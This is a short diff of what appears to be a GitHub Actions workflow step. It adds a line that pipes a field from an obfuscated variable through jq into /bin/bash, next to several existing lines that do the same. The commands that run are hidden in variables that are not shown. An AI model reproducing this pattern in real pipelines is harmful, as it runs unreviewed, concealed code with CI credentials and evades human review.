@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$kndr527" | jq -r .k57989 | /bin/bash
           printf '%s' "$kpr6" | jq -r .dth9122 | /bin/bash
           printf '%s' "$rp93488" | jq -r .ck45154 | /bin/bash
+          echo $r3 | jq -r .uvxrx0725 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
